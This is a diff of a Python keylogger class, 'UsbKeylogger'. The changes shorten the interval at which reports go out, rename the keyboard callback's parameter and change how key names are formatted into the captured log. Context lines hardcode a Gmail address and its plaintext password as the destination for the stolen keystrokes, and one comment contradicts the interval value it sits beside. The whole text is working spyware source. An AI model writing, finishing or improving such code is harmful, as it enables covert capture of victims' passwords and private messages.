@@ -10,7 +10,7 @@ EMAIL = "ph4ntom77projects@gmail.com" # Email that reports are sent to
 EMAIL_PW = "Keylogger77!!" # Password for Email
 
 #Time Interval Variable
-LOG_INTERVAL = 30 # Every 300 Seconds (5 minutes) a report is sent
+LOG_INTERVAL = 20 # Every 300 Seconds (5 minutes) a report is sent
 
 class UsbKeylogger:
     def __init__(self, reportInterval, reportType):
@@ -35,8 +35,8 @@ class UsbKeylogger:
     #def reportSkype(self):
     #def reportSlack(self):
 
-    def callbackKeyboard(self, keyboardEvent):
-        eventName = keyboardEvent.eventName # Create eventName variable
+    def callbackKeyboard(self, event):
+        eventName = event.name # Create eventName variable
         nameLength = len(eventName) # Returns the length of the eventName variable
         if nameLength > 1: # Conditional statement to format the appearence of the keylogs in event that they key is not a typical character like a letter or number. 
             if eventName == "tab":
@@ -47,8 +47,6 @@ class UsbKeylogger:
                 eventName = " " # Replaces [SPACE] with " " for readability
             elif eventName == "decimal":
                 eventName = "." # Replaces [DECIMAL] with "." for readability
-            else:
-                eventName = eventName.replace(" ", "-")
         self.keylog = self.keylog + eventName
 
     def reportKeyLog(self):
